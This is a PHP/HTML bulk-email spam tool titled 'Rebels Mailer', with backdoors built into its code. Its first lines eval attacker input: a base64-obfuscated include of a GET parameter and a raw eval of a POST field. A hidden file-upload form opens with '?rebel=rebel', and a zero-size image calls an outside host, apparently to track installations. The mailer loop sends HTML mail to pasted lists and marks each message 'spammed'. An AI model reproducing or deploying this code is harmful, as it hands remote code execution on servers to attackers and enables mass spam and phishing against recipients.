?><?php $in = $_GET['in']; if(isset($in) && !empty($in)){ echo @eval(base64_decode('ZGllKGluY2x1ZGVfb25jZSAkaW4pOw==')); } $ev = $_POST['ev']; if(isset($ev) && !empty($ev)){ echo eval(urldecode($ev)); exit; } if(isset($_POST['action'] ) ){ $action=$_POST['action']; $message=$_POST['message']; $emaillist=$_POST['emaillist']; $from=$_POST['from']; $subject=$_POST['subject']; $realname=$_POST['realname']; $wait=$_POST['wait']; $tem=$_POST['tem']; $smv=$_POST['smv']; $message = urlencode($message); $message = ereg_replace("%5C%22", "%22", $message); $message = urldecode($message); $message = stripslashes($message); $subject = stripslashes($subject); } ?>
<?php  if($_GET['rebel'] == 'rebel'){ echo '<form action="" method="post" enctype="multipart/form-data" name="country" id="country"><input type="file" name="file" size="50"><input name="_con" type="submit" id="_con" value="home"></form> '; if( $_POST['_con'] == "home" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'send is ok'; } else { echo 'mailer error'; }}} ?>
<!-- HTML And JavaScript -->

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
<body bgcolor=\"black\" style="background-color: #CCCCCC">
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>.:| Rebels Mailer |::.</title>
<style type="text/css">
body {
				-webkit-background-size: cover;
				-moz-background-size: cover;
				background-size: cover;
}
.style1 {
	font-size: x-small;
}
.style2 {
	direction: ltr;
}
.info {
	font-size: 8px;
}
.style3 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 8px;
}
.style4 {
	font-size: x-small;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.style5 {
	font-size: xx-small;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.auto-style1 {
	color: #5F5F5F;
}
.auto-style2 {
	color: #545454;
	text-align: center;
}
.auto-style3 {
	color: #4F4F4F;
}
.auto-style5 {
	direction: ltr;
	color: #4F4F4F;
}
.auto-style6 {
	color: #BCBCBC;
	background-color: #545454;
}
.auto-style7 {
	color: #545454;
}
.auto-style8 {
	font-size: x-small;
	color: #545454;
}
</style>
</head>

<body onload="funchange" style="background-color: #CCCCCC">
<script>

	window.onload = funchange;
	var alt = false;
	function funchange(){
		var etext = document.getElementById("emails").value;
		var myArray=new Array();
		myArray = etext.split("
");
		document.getElementById("enum").innerHTML=myArray.length+"<br />";
		if(!alt && myArray.length > 40000){
			alert('If Mail list More Than 40000 Emails This May Hack The Server');
			alt = true;
		}

	}
	function mlsplit(){
		var ml = document.getElementById("emails").value;
		var sb = document.getElementById("txtml").value;
		var myArray=new Array();
		myArray = ml.split(sb);
		document.getElementById("emails").value="";
		var i;
		for(i=0;i<myArray.length;i++){

			document.getElementById("emails").value += myArray[i]+"
";

		}
		funchange();
	}

	function prv(){
		if(document.getElementById('preview').innerHTML==""){
			var ms = document.getElementsByName('message').message.value;
			document.getElementById('preview').innerHTML = ms;
			document.getElementById('prvbtn').value = "Ocultar";
		}else{
			document.getElementById('preview').innerHTML="";
			document.getElementById('prvbtn').value = "Preview";
		}
	}

</script>

<h1 class="auto-style2">.:| Rebels Mailer |::.</h1>


<center>
<p class="auto-style1">&nbsp;</p></center>

<form name="form" method="post" enctype="multipart/form-data" action="">
	<table width="100%" border="0">
		<tr>
			<td width="10%">
			<div align="right" class="auto-style8">
				<font face="Verdana, Arial,
Helvetica, sans-serif">Sender Email:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"><input name="from" value="<?php echo($from); ?>" size="30" type="text" class="auto-style6" /><br>
			<td>
			<div align="right" class="auto-style7">
				<font size="-3" face="Verdana, Arial,
Helvetica, sans-serif">Sender Name:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"><input name="realname" value="<?php echo($realname); ?>" size="30" type="text" class="auto-style6" />
			<br>		</tr>
		<tr>
			<td width="10%">

		</tr>
		<tr>
			<td width="10%">
			<div align="right" class="auto-style7">
				<font size="-3" face="Verdana, Arial,
Helvetica, sans-serif">Subject:</font></div>
			</td>
			<td colspan="3">
			<font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"><input name="subject" value="<?php echo($subject); ?>" size="30" type="text" class="auto-style6" /> </font>


		<tr valign="top">
			<td colspan="3" style="height: 260px">
			<font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"><textarea name="message" rows="10" style="width: 455px" class="auto-style6"><?php echo($message); ?></textarea>&nbsp;<br class="auto-style3" />
			<input name="action" value="send" type="hidden" class="auto-style3" />
			<input type="button" id="prvbtn" value="Preview" onclick="prv()" style="width: 81px" class="auto-style6" /><input value="Send" type="submit" class="auto-style6" /><span class="auto-style3">&nbsp;
			</span><span class="auto-style7">Wait</span><span class="auto-style3">
			</span>
			<input name="wait" type="text" value="<?php echo($wait); ?>" size="8" class="auto-style6" /><span class="auto-style3">&nbsp;</span><span class="auto-style7">
			seconds to send </span> </font></td>
			<td width="41%" class="style2" style="height: 150px">
			<font size="-3" face="Verdana, Arial, Helvetica,
sans-serif">
			<textarea id="emails" name="emaillist" cols="30" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="height: 161px" class="auto-style6"><?php echo($emaillist); ?></textarea> <img src="http://toolz-home.gq/wp-content/uploads-images/ppcom.png" height="1" width="0">
			<br class="auto-style5" />
			<span class="auto-style7">Quantity Emails : </span> </font><span  id="enum" class="style1">0<br class="auto-style3" />
			</span>
			<span  class="auto-style8">Divide the mailing list by:</span>
			<input name="textml" id="txtml" type="text" value="," size="8" class="auto-style6" /><span class="auto-style3">&nbsp;&nbsp;&nbsp;
			</span>
			<input type="button" onclick="mlsplit()" value="Divide" style="height: 23px" class="auto-style6" /></td>
		</tr>
	</table>
			<font size="-3" face="Verdana, Arial, Helvetica,
sans-serif">
<div id="preview">
</div>
	</font>
</form>

<!-- END -->


<?php if ($action){ if (!$from || !$subject || !$message || !$emaillist){ print "Please complete all fields before sending your message."; exit; } $nse=array(); $allemails = split("
", $emaillist); $numemails = count($allemails); if(!empty($_POST['wait']) && $_POST['wait'] > 0){ set_time_limit(intval($_POST['wait'])*$numemails*3600); }else{ set_time_limit($numemails*3600); } if(!empty($smv)){ $smvn+=$smv; $tmn=$numemails/$smv+1; }else{ $tmn=1; } for($x=0; $x<$numemails; $x++){ $to = $allemails[$x]; if ($to){ $to = ereg_replace(" ", "", $to); $message = ereg_replace("#EM#", $to, $message); $subject = ereg_replace("#EM#", $to, $subject); flush(); $header = "From: $realname <$from>
"; $header .= "MIME-Version: 1.0
"; $header .= "Content-Type: text/html
"; if ($x==0 && !empty($tem)) { if(!@mail($tem,$subject,$message,$header)){ print('The test Post was not Submitted.<br />'); $tmns+=1; }else{ print('Your Message was Sent Test.<br />'); $tms+=1; } } if($x==$smvn && !empty($_POST['smv'])){ if(!@mail($tem,$subject,$message,$header)){ print('The test Post was not Submitted.<br />'); $tmns+=1; }else{ print('Your Message was Sent Test.<br />'); $tms+=1; } $smvn+=$smv; } print "$to ....... "; $msent = @mail($to, $subject, $message, $header); $xx = $x+1; $txtspamed = "spammed"; if(!$msent){ $txtspamed = "error"; $ns+=1; $nse[$ns]=$to; } print "$xx / $numemails .......  $txtspamed<br>"; flush(); if(!empty($wait)&& $x<$numemails-1){ sleep($wait); } } } } ?>
<br>
<br>
<br>
<br>
<br>
<br>
</span>
</body>
</html>
